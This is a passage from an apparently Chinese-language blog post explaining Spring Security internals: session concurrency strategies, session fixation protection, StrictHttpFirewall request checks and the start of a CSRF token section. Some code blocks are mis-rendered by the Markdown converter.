class="hljs-operator">=</span> sessions.size() - allowableSessions + <span class="hljs-number">1</span>;<br>        List&lt;SessionInformation&gt; sessionsToBeExpired = sessions.subList(<span class="hljs-number">0</span>, maximumSessionsExceededBy);<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> sessionsToBeExpired.iterator();<br><br>        <span class="hljs-keyword">while</span>(var6.hasNext()) &#123;<br>            <span class="hljs-type">SessionInformation</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> (SessionInformation)var6.next();<br>            session.expireNow();<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionAuthenticationException</span>(<span class="hljs-built_in">this</span>.messages.getMessage(<span class="hljs-string">&quot;ConcurrentSessionControlAuthenticationStrategy.exceededAllowed&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;allowableSessions&#125;, <span class="hljs-string">&quot;Maximum sessions of &#123;0&#125; for this principal exceeded&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果exceptionIfMaximumExceeded属性为true，则直接抛出异常，该属性的值也就是我们在SecurityConfig中通过maxSessionsPreventsLogin方法配置的值，即禁止后来者登录，抛出异常后，本次登录失败。否则说明不禁止后来者登录，此时对查询出来的当前用户所有登录会话按照最后一次请求时间进行排序，然后计算出需要过期的session数量，从sessions集合中取出来进行遍历，依次调用其expireNow方法使之过期。<br>这便是ConcurrentSessionControlAuthenticationStrategy类的实现逻辑。</p><h6 id="RegisterSessionAuthenticationStrategy"><a href="#RegisterSessionAuthenticationStrategy" class="headerlink" title="RegisterSessionAuthenticationStrategy"></a>RegisterSessionAuthenticationStrategy</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterSessionAuthenticationStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SessionAuthenticationStrategy</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SessionRegistry sessionRegistry;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RegisterSessionAuthenticationStrategy</span><span class="hljs-params">(SessionRegistry sessionRegistry)</span> &#123;<br>        Assert.notNull(sessionRegistry, <span class="hljs-string">&quot;The sessionRegistry cannot be null&quot;</span>);<br>        <span class="hljs-built_in">this</span>.sessionRegistry = sessionRegistry;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAuthentication</span><span class="hljs-params">(Authentication authentication, HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sessionRegistry.registerNewSession(request.getSession().getId(), authentication.getPrincipal());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出该类就是调用了上面的SessionRegistry的registerNewSession方法来传入sessionid和用户对象</p><h6 id="CompositeSessionAuthenticationStrategy"><a href="#CompositeSessionAuthenticationStrategy" class="headerlink" title="CompositeSessionAuthenticationStrategy"></a>CompositeSessionAuthenticationStrategy</h6><p>查看该类的onAuthentication</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAuthentication</span><span class="hljs-params">(Authentication authentication, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> SessionAuthenticationException &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">currentPosition</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.delegateStrategies.size();<br><br>    SessionAuthenticationStrategy delegate;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">Iterator</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.delegateStrategies.iterator(); var6.hasNext(); delegate.onAuthentication(authentication, request, response)) &#123;<br>        delegate = (SessionAuthenticationStrategy)var6.next();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isTraceEnabled()) &#123;<br>            <span class="hljs-type">Log</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.logger;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var10002</span> <span class="hljs-operator">=</span> delegate.getClass().getSimpleName();<br>            ++currentPosition;<br>            var10000.trace(LogMessage.format(<span class="hljs-string">&quot;Preparing session with %s (%d/%d)&quot;</span>, var10002, currentPosition, size));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出该方法就是调用各个SessionAuthenticationStrategy的onAuthentication</p><p>所以!!!他是一个代理类~~~</p><h5 id="SessionManagementFilter"><a href="#SessionManagementFilter" class="headerlink" title="SessionManagementFilter"></a>SessionManagementFilter</h5><p>主要用来处理RememberMe登录时的会话管理：即如果用户使用了RememberMe的方式进行认证，则认证成功后需要进行会话管理，相关的管理操作通过SessionManagementFilter过滤器触发。</p><p>通过containsContext方法去判断当前会话中是否存在SPRING_SECURITY_CONTEXT变量,emmm啥时候不存在呢:</p><p>（1）用户使用了RememberMe方式进行认证。<br>（2）用户匿名访问某一个接口。</p><p>然后根据这两种不同的认证则token也不一样第一种为RememberMeAuthenticationToken会对其进行</p><h5 id="ConcurrentSessionFilter"><a href="#ConcurrentSessionFilter" class="headerlink" title="ConcurrentSessionFilter"></a>ConcurrentSessionFilter</h5><p>在doFilter方法中:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">SessionInformation</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.sessionRegistry.getSessionInformation(session.getId());<br>        <span class="hljs-keyword">if</span> (info != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (info.isExpired()) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(LogMessage.of(() -&gt; &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Requested session ID &quot;</span> + request.getRequestedSessionId() + <span class="hljs-string">&quot; has expired.&quot;</span>;<br>                &#125;));<br>                <span class="hljs-built_in">this</span>.doLogout(request, response);<br>                <span class="hljs-built_in">this</span>.sessionInformationExpiredStrategy.onExpiredSessionDetected(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionInformationExpiredEvent</span>(info, request, response));<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.sessionRegistry.refreshLastRequest(info.getSessionId());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>首先获取session如果不是空则,根据sessionId获取session信息并检测是否为空是否过期,如果都满足则刷新最后一次的请求时间,</p><p>如果过期了则进行登出</p><p>HttpSession的四种创建策略</p><ul><li>ALWAYS:HttpSession不存在就创建</li><li>NEVER:不存在也不创建,如果有就直接使用</li><li>IF_REQUIRED:如果需要才创建(默认)</li><li>STATELESS:从不创建HttpSession,也不使用HttpSession(无状态认证)</li></ul><p>如果用户想要指定用什么类型则：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    http.sessionManagement()<br>        .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="SessionManagementConfigurer"><a href="#SessionManagementConfigurer" class="headerlink" title="SessionManagementConfigurer"></a>SessionManagementConfigurer</h5><p>该configurer用来配置上面两个过滤器的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(H http)</span> &#123;<br>    <span class="hljs-type">SecurityContextRepository</span> <span class="hljs-variable">securityContextRepository</span> <span class="hljs-operator">=</span> (SecurityContextRepository)http.getSharedObject(SecurityContextRepository.class);<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">stateless</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isStateless();<br>    <span class="hljs-keyword">if</span> (securityContextRepository == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (stateless) &#123;<br>            http.setSharedObject(SecurityContextRepository.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullSecurityContextRepository</span>());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">HttpSessionSecurityContextRepository</span> <span class="hljs-variable">httpSecurityRepository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpSessionSecurityContextRepository</span>();<br>            httpSecurityRepository.setDisableUrlRewriting(!<span class="hljs-built_in">this</span>.enableSessionUrlRewriting);<br>            httpSecurityRepository.setAllowSessionCreation(<span class="hljs-built_in">this</span>.isAllowSessionCreation());<br>            <span class="hljs-type">AuthenticationTrustResolver</span> <span class="hljs-variable">trustResolver</span> <span class="hljs-operator">=</span> (AuthenticationTrustResolver)http.getSharedObject(AuthenticationTrustResolver.class);<br>            <span class="hljs-keyword">if</span> (trustResolver != <span class="hljs-literal">null</span>) &#123;<br>                httpSecurityRepository.setTrustResolver(trustResolver);<br>            &#125;<br><br>            http.setSharedObject(SecurityContextRepository.class, httpSecurityRepository);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">RequestCache</span> <span class="hljs-variable">requestCache</span> <span class="hljs-operator">=</span> (RequestCache)http.getSharedObject(RequestCache.class);<br>    <span class="hljs-keyword">if</span> (requestCache == <span class="hljs-literal">null</span> &amp;&amp; stateless) &#123;<br>        http.setSharedObject(RequestCache.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullRequestCache</span>());<br>    &#125;<br><br>    http.setSharedObject(SessionAuthenticationStrategy.class, <span class="hljs-built_in">this</span>.getSessionAuthenticationStrategy(http));<br>    http.setSharedObject(InvalidSessionStrategy.class, <span class="hljs-built_in">this</span>.getInvalidSessionStrategy());<br>&#125;<br></code></pre></td></tr></table></figure><p>首先从http中获取SecurityContextRepository，如果不为空则判断是否采用STATELESS策略</p><p>如果采用则设置一个NullSecurityContextRepository(空的),如果不是空则保存HttpSessionSecurityContextRepository对象</p><p>最后将SessionAuthenticationStrategy和InvalidSessionStrategy放入共享对象中</p><blockquote><p>其中SessionAuthenticationStrategy实例是通过getSession AuthenticationStrategy方法来获取的，在该方法中，一共构建了三个SessionAuthentication Strategy实例，分别是ConcurrentSessionControlAuthenticationStrategy、ChangeSessionId AuthenticationStrategy以及RegisterSessionAuthenticationStrategy，并将这三个实例由Composite SessionAuthenticationStrategy进行代理，所以getSessionAuthenticationStrategy方法最终返回的是CompositeSessionAuthenticationStrategy类的实例。</p></blockquote><p>防御固定会话攻击,在配置文件中做如下配置:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http.sessionManagement().sessionFixation().changeSessionId();<br></code></pre></td></tr></table></figure><p>这个.changeSessionId();可以换成下面这些</p><blockquote><p>（1）changeSessionId()：用户登录成功后，直接修改HttpSession的SessionId即可，默认方案即此，对应的处理类是ChangeSessionIdAuthenticationStrategy。</p></blockquote><blockquote><p>（2）none()：用户登录成功后，HttpSession不做任何变化，对应的处理类是NullAuthenticatedSessionStrategy。</p></blockquote><blockquote><p>（3）migrateSession()：用户登录成功后，创建一个新的HttpSession对象，并将旧的HttpSession中的数据拷贝到新的HttpSession中，对应的处理类是SessionFixationProtection Strategy。</p></blockquote><blockquote><p>（4）newSession()：用户登录成功后，创建一个新的HttpSession对象，对应的处理类也是SessionFixationProtectionStrategy，只不过将其里边的migrateSessionAttributes属性设置为false。需要注意的是，该方法并非所有的属性都不拷贝，一些Spring Security使用的属性，如请求缓存，还是会从旧的HttpSession上复制到新的HttpSession。</p></blockquote><h3 id="HttpFirewall"><a href="#HttpFirewall" class="headerlink" title="HttpFirewall"></a>HttpFirewall</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HttpFirewall</span> &#123;<br>    FirewalledRequest <span class="hljs-title function_">getFirewalledRequest</span><span class="hljs-params">(HttpServletRequest var1)</span> <span class="hljs-keyword">throws</span> RequestRejectedException;<br><br>    HttpServletResponse <span class="hljs-title function_">getFirewalledResponse</span><span class="hljs-params">(HttpServletResponse var1)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出只有两个接口函数</p><ul><li>getFirewalledRequest：用来对request进行封装并且在HttpServletRequestWrapper的基础上增加了reset方法。当过滤链完毕时，由FilterChainProxy来调用reset方法来重置属性</li><li>getFirewalledResponse：重写了sendRedirect、setHeader、addHeader以及addCookie四个方法，在每个方法中都添加一种过滤来过滤\n和\r</li></ul><p>他有两个实现类</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211026151827472.png" alt="image-20211026151827472"></p><ul><li>DefaultHttpFirewall:是一种宽松的防火墙</li><li>StrictHttpFirewall:默认的,是一种严格的防火墙</li></ul><p>由于FilterChainProxy是通过WebSecurity来构建的,而FilterChainProxy是默认使用StrictHttpFirewall来填充的.所以我们注册一个自己的HttpFirewallBean就会自动填充为自己的Bean</p><h4 id="HttpFirewall严格模式"><a href="#HttpFirewall严格模式" class="headerlink" title="HttpFirewall严格模式"></a>HttpFirewall严格模式</h4><p>由于在FilterChainProxy#doFilterInternal中触发请求校验的方法如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(ServletRequest request,ServletResponse response,FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>      <span class="hljs-type">FirewalledRequest</span> <span class="hljs-variable">fwRequest</span> <span class="hljs-operator">=</span> firewall<br>              .getFirewalledRequest((HttpServletRequest) request);<br>      <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">fwResponse</span> <span class="hljs-operator">=</span> firewall<br>              .getFirewalledResponse((HttpServletResponse) response);<br>      <span class="hljs-comment">//省略其他</span><br>      vfc.doFilter(fwRequest, fwResponse);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出主要调用了getFirewalledRequest和getFirewalledResponse</p><p>通过源码可以看到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> FirewalledRequest <span class="hljs-title function_">getFirewalledRequest</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> RequestRejectedException &#123;<br>    <span class="hljs-built_in">this</span>.rejectForbiddenHttpMethod(request);<br>    <span class="hljs-built_in">this</span>.rejectedBlocklistedUrls(request);<br>    <span class="hljs-built_in">this</span>.rejectedUntrustedHosts(request);<br>    <span class="hljs-keyword">if</span> (!isNormalized(request)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestRejectedException</span>(<span class="hljs-string">&quot;The request was rejected because the URL was not normalized.&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        <span class="hljs-keyword">if</span> (!containsOnlyPrintableAsciiCharacters(requestUri)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestRejectedException</span>(<span class="hljs-string">&quot;The requestURI was rejected because it can only contain printable ASCII characters.&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StrictHttpFirewall</span>.StrictFirewalledRequest(request);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一共有五个校验:</p><ul><li><p>rejectForbiddenHttpMethod：校验请求方法是否合法。</p><ul><li><blockquote><pre><code class="java">private void rejectForbiddenHttpMethod(HttpServletRequest request) &#123;if (this.allowedHttpMethods != ALLOW_ANY_HTTP_METHOD) &#123;  if (!this.allowedHttpMethods.contains(request.getMethod())) &#123;      throw new RequestRejectedException(&quot;The request was rejected because the HTTP method \&quot;&quot; + request.getMethod() + &quot;\&quot; was not included within the list of allowed HTTP methods &quot; + this.allowedHttpMethods);  &#125;&#125;&#125;<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs scala"><br>- allowedHttpMethods是一个set集合默认情况下设置了<span class="hljs-type">DELETE</span>、<span class="hljs-type">GET</span>、<span class="hljs-type">HEAD</span>、<span class="hljs-type">OPTIONS</span>、<span class="hljs-type">PATCH</span>、<span class="hljs-type">POST</span>、<span class="hljs-type">PUT</span>只要满足了这些都不会进行拦截<br><br>- 修改方法一<br><br>- &gt;```java<br>  &gt;<span class="hljs-meta">@Configuration</span><br>  &gt;public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebSecurityConfigurerAdapter</span> </span>&#123;<br>  &gt;<span class="hljs-meta">@Bean</span><br>  &gt;<span class="hljs-type">HttpFirewall</span> httpFirewall() &#123;<br><span class="hljs-type">StrictHttpFirewall</span> strictHttpFirewall = <span class="hljs-keyword">new</span> <span class="hljs-type">StrictHttpFirewall</span>();<br><span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; allowedHttpMethods = <span class="hljs-keyword">new</span> <span class="hljs-type">HashSet</span>&lt;&gt;();<br>allowedHttpMethods.add(<span class="hljs-type">HttpMethod</span>.<span class="hljs-type">POST</span>.name());<br>strictHttpFirewall.setAllowedHttpMethods(allowedHttpMethods);<br><span class="hljs-keyword">return</span> strictHttpFirewall;<br>  &gt;&#125;<br>  &gt;<span class="hljs-comment">//省略其他</span><br>  &gt;&#125;<br></code></pre></td></tr></table></figure></code></pre></blockquote></li><li><p>重启项目后只能使用post进行提交了</p></li><li><blockquote><pre><code class="java">@BeanHttpFirewall httpFirewall() &#123;StrictHttpFirewall strictHttpFirewall = new StrictHttpFirewall();strictHttpFirewall.setUnsafeAllowAnyHttpMethod(true);return strictHttpFirewall;&#125;<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br> - 这种方式设置为<span class="hljs-keyword">true</span>就代表上面源代码中if分支内的this.allowedHttpMethods为ALLOW_ANY_HTTP_METHOD所以直接不进行过滤<br><br>- rejectedBlacklistedUrls：校验请求中的非法字符。<br><br> - &gt; 包含了分号，即 <span class="hljs-comment">; 、%3b、%3B，则该请求会被拒绝。可以通过setAllowSemicolon方法开启或者关闭这一规则。</span><br>包含了斜杠，即<span class="hljs-variable">%2</span>f、<span class="hljs-variable">%2</span>F，则该请求会被拒绝。可以通过setAllowUrlEncodedSlash方法开启或者关闭这一规则。<br>包含了反斜杠，即\\、<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>、<span class="hljs-variable">%5</span>C，则该请求会被拒绝。可以通过setAllowBackSlash方法开启或者关闭这一规则。<br>如果请求URL在编码之后包含了<span class="hljs-variable">%25</span>，亦或者在编码之前包含了%，则该请求会被拒绝。可以通过setAllowUrlEncodedPercent方法开启或者关闭这一规则。<br>如果请求URL在URL编码后包含了英文句号<span class="hljs-variable">%2</span>e或者<span class="hljs-variable">%2</span>E，则该请求会被拒绝。可以通过setAllowUrlEncodedPeriod方法开启或者关闭这一规则。<br><br> - 在源代码中有两个层嵌套循环<span class="hljs-punctuation">,</span>第一层遍历所有字符另一层从List中获取相同字符的不同编码<br><br>- rejectedUntrustedHosts：检验主机信息。<br><br> - 用来检验host是否可信<br><br> - &gt;```java<br>   &gt;<span class="hljs-keyword">private</span> void rejectedUntrustedHosts(HttpServletRequest request) &#123;<br>   &gt;String serverName <span class="hljs-operator">=</span> request.getServerName()<span class="hljs-comment">;</span><br>   &gt;if (serverName !<span class="hljs-operator">=</span> <span class="hljs-keyword">null</span> &amp;&amp; <span class="hljs-title">!this.allowedHostnames.test</span>(serverName)) &#123;<br>  throw new RequestRejectedException(<span class="hljs-string">&quot;The request was rejected because the domain &quot;</span> + serverName + <span class="hljs-string">&quot; is untrusted.&quot;</span>)<span class="hljs-comment">;</span><br>   &gt;&#125;<br>   &gt;&#125;<br></code></pre></td></tr></table></figure>可以看出是验证serverName而后面的test方法默认总是返回true</code></pre></blockquote></li><li><p>可以使用下面这种方式进行配置</p></li><li><blockquote><p>@Bean<br>HttpFirewall httpFirewall() {<br>   StrictHttpFirewall strictHttpFirewall &#x3D; new StrictHttpFirewall();<br>   strictHttpFirewall.setAllowedHostnames(<br>        (hostname) -&gt; hostname.equalsIgnoreCase(“local.javaboy.org”));<br>   return strictHttpFirewall;<br>}</p></blockquote></li><li><p>这样除了local.javaboy.org以外的host都不会匹配成功</p></li></ul></li><li><p>isNormalized：判断参数格式是否合法。</p><ul><li><p>isNormalized方法主要用来检查请求地址是否规范，什么样的地址就算规范呢？即不包含”.&#x2F;“、”&#x2F;..&#x2F;“以及”&#x2F;.”三种字符。</p></li><li><blockquote><pre><code class="java">private static boolean isNormalized(HttpServletRequest request) &#123; if (!isNormalized(request.getRequestURI())) &#123;     return false; &#125; else if (!isNormalized(request.getContextPath())) &#123;     return false; &#125; else if (!isNormalized(request.getServletPath())) &#123;     return false; &#125; else &#123;     return isNormalized(request.getPathInfo()); &#125;&#125;<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>通过源码可知分别对URL,ContextPath,ServletPath,PathInfo进行校验<br><br>- containsOnlyPrintableAsciiCharacters：判断请求字符是否合法。<br><br> - ```<span class="hljs-function">java</span><br><span class="hljs-function">   <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">containsOnlyPrintableAsciiCharacters</span><span class="hljs-params">(<span class="hljs-type">String</span> uri)</span> </span>&#123;<br>       <span class="hljs-type">int</span> length = uri.<span class="hljs-built_in">length</span>();<br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>           <span class="hljs-type">char</span> c = uri.<span class="hljs-built_in">charAt</span>(i);<br>           <span class="hljs-keyword">if</span> (c &lt; <span class="hljs-string">&#x27;\u0020&#x27;</span> || c &gt; <span class="hljs-string">&#x27;\u007e&#x27;</span>) &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>   &#125;<br></code></pre></td></tr></table></figure></code></pre></blockquote></li><li><p>用于检测是否包含不可打印字符</p></li></ul></li></ul><p>这就是StrictHttpFirewall中的所有校验规则了。其中前三种，开发者可以通过相关方法调整参数进而调整校验行为，后面两种则不可调整。</p><h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><h5 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h5><p>具体演示的介绍csrf就不在这里说了</p><p>重点介绍csrf防御和csrf的原理</p><p>分为两种：</p><h6 id="一个是令牌同步模式："><a href="#一个是令牌同步模式：" class="headerlink" title="一个是令牌同步模式："></a>一个是令牌同步模式：</h6><p>其中GET、HEAD、OPTIONS、TRACE方法不应该改变应用的状态。</p><p>该方法时在每次提交时都会带上一个CSRF令牌</p><p><strong>创建如下html页面</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span 